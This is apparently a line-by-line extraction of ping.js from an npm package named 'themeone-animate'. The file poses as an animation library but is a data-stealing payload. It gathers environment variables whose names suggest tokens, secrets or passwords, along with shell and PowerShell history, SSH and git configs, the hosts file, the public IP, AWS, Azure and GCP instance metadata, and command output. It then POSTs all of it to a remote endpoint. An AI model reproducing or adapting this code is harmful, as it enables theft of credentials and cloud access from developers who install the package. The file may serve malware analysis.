// File: tmp/tmp6zrs4jip/themeone-animate/package/ping.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 3: const path = require('path')
Line 4: const fs = require('fs')
Line 5: _tmp_31 = require('child_process')
Line 6: const dns = require('dns')
Line 10: {
  const payload = JSON.stringify(data);
  const options = {
    hostname: endpoint,
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };
  const req = https.request(options, res => {});
  req.on('error', () => {});
  req.write(payload);
  req.end();
}
Line 22: const req = https.request(options, res => {})
Line 24: req.write(payload)
Line 25: req.end()
Line 31: fs.readFileSync(filePath, 'utf8')
Line 39: (_tmp_3 = https.get('https://api.ipify.org?format=json', res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const ip = JSON.parse(data).ip;
          resolve(ip);
        } catch {
          resolve(null);
        }
      });
    }))
Line 44: const ip = JSON.parse(data).ip
Line 55: {
    exec(cmd, (err, stdout, stderr) => {
      if (err) resolve(stderr || 'error');
      else resolve(stdout);
    });
  }
Line 56: exec(cmd, (err, stdout, stderr) => {
      if (err) resolve(stderr || 'error');
      else resolve(stdout);
    })
Line 65: execSync(cmd, {timeout: 3000}).toString()
Line 76: _tmp_8.push("http://169.254.169.254/latest/dynamic/instance-identity/document")
Line 77: _tmp_8.push("http://169.254.169.254/latest/meta-data/instance-id")
Line 78: _tmp_8.push("http://169.254.169.254/latest/meta-data/hostname")
Line 79: _tmp_8.push("http://169.254.169.254/latest/meta-data/public-ipv4")
Line 82: _iterator_0.next()
Line 84: const result = await new Promise((resolve, reject) => {
        const req = https.get(url, {timeout: 1000}, res => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve(data));
        });
        req.on('error', () => resolve(null));
        req.on('timeout', () => {
          req.destroy();
          resolve(null);
        });
      })
Line 85: const req = https.get(url, {timeout: 1000}, res => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve(data));
        })
Line 91: {
          req.destroy();
          resolve(null);
        }
Line 92: req.destroy()
Line 102: const azureData = await new Promise((resolve) => {
      const options = {
        hostname: '169.254.169.254',
        path: '/metadata/instance?api-version=2021-02-01',
        headers: {'Metadata': 'true'},
        timeout: 1000
      };
      const req = https.request(options, res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve(data));
      });
      req.on('error', () => resolve(null));
      req.end();
    })
Line 109: const req = https.request(options, res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve(data));
      })
Line 115: req.end()
Line 122: const gcpData = await new Promise((resolve) => {
      const options = {
        hostname: 'metadata.google.internal',
        path: '/computeMetadata/v1/instance/id',
        headers: {'Metadata-Flavor': 'Google'},
        timeout: 1000
      };
      const req = https.request(options, res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve(data));
      });
      req.on('error', () => resolve(null));
      req.end();
    })
Line 129: const req = https.request(options, res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve(data));
      })
Line 135: req.end()
Line 143: {
  const home = os.homedir();
  const isWindows = os.platform().startsWith('win');
  const bashHistoryPath = path.join(home, '.bash_history');
  const powershellHistoryPath = path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine', 'ConsoleHost_history.txt');
  const hostsFilePath = isWindows ? 'C:\\Windows\\System32\\drivers\\etc\\hosts' : '/etc/hosts';
  const sshConfigPath = path.join(home, '.ssh', 'config');
  const gitGlobalConfig = path.join(home, '.gitconfig');
  
  // Collect environment variables, filter suspicious
  const envVars = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (/token|secret|key|password|credential|auth/i.test(key)) {
      envVars[key] = value;
    }
  }

  // Git config parsing helper (basic)
  function parseGitConfig(content) {
    const info = {};
    const userNameMatch = content.match(/\[user\][\s\S]*?name\s*=\s*(.+)/);
    const userEmailMatch = content.match(/\[user\][\s\S]*?email\s*=\s*(.+...
Line 145: os.platform()
Line 146: path.join(home, '.bash_history')
Line 147: const powershellHistoryPath = path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine', 'ConsoleHost_history.txt')
Line 149: path.join(home, '.ssh', 'config')
Line 150: path.join(home, '.gitconfig')
Line 154: _iterator_1.next()
Line 155: /token|secret|key|password|credential|auth/i.test(key)
Line 156: envVars[key] = value
Line 161: {
    const info = {};
    const userNameMatch = content.match(/\[user\][\s\S]*?name\s*=\s*(.+)/);
    const userEmailMatch = content.match(/\[user\][\s\S]*?email\s*=\s*(.+)/);
    const remoteUrlMatches = [...content.matchAll(/\[remote "(.+)"\][\s\S]*?url\s*=\s*(.+)/g)];
    if (userNameMatch) info.userName = userNameMatch[1].trim();
    if (userEmailMatch) info.userEmail = userEmailMatch[1].trim();
    if (remoteUrlMatches.length) {
      info.remotes = remoteUrlMatches.map(m => ({name: m[1], url: m[2].trim()}));
    }
    return info;
  }
Line 163: const userNameMatch = content.match(/\[user\][\s\S]*?name\s*=\s*(.+)/)
Line 164: const userEmailMatch = content.match(/\[user\][\s\S]*?email\s*=\s*(.+)/)
Line 165: const remoteUrlMatches = [...content.matchAll(/\[remote "(.+)"\][\s\S]*?url\s*=\s*(.+)/g)]
Line 166: userNameMatch[1].trim()
Line 167: userEmailMatch[1].trim()
Line 168: {
      info.remotes = remoteUrlMatches.map(m => ({name: m[1], url: m[2].trim()}));
    }
Line 169: info.remotes = remoteUrlMatches.map(m => ({name: m[1], url: m[2].trim()}))
Line 176: path.join(process.cwd(), '.git', 'config')
Line 177: readFileSafe(gitGlobalConfig)
Line 178: readFileSafe(cwdGitConfigPath)
Line 179: readFileSafe(cwdGitConfigPath)
Line 185: os.hostname()
Line 199: readFileSafe(bashHistoryPath)
Line 200: const powershellHistory = isWindows ? readFileSafe(powershellHistoryPath) : null
Line 203: readFileSafe(hostsFilePath)
Line 204: readFileSafe(sshConfigPath)
Line 210: getCloudMetadata()
Line 223: const data = {
    hostname,
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    timestamp: new Date().toISOString(),
    installPath: path.resolve(__dirname),
    cwd: process.cwd(),
    systemInfo,
    processList,
    bashHistory,
    powershellHistory,
    hostsFile,
    sshConfig,
    envVars,
    gitConfigInfo,
    dnsEntry,
    publicIP,
    cloudMetadata,
    installedPackages,
  }
Line 225: os.userInfo()
Line 226: os.platform()
Line 227: os.arch()
Line 234: _tmp_28.powershellHistory = powershellHistory
Line 245: send(data)
